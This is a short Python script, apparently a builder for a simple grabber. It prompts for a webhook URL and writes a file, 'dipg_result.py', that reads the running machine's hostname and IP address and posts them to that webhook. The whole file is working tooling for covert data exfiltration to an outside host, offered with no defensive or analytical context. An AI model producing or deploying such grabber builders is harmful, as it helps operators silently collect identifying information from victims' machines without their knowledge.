import socket
import requests

# Collect the webhook URL from user input
webhook_url = input("> url: ")
hostname = "{hostname}"
IPAddr = "{IPAddr}"
response = ""

# Create the code string
code = f'''
import socket
import requests

webhook_url = "{webhook_url}"
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
message = f"Hostname: {hostname}\\nIP Address: {IPAddr}"
data = {{"content": message}}
response = requests.post(webhook_url, json=data)
'''

# Write the code string to the file
with open("dipg_result.py", "w") as file:
    file.write(code)

print("File 'dipg_result.py' has been created successfully.")
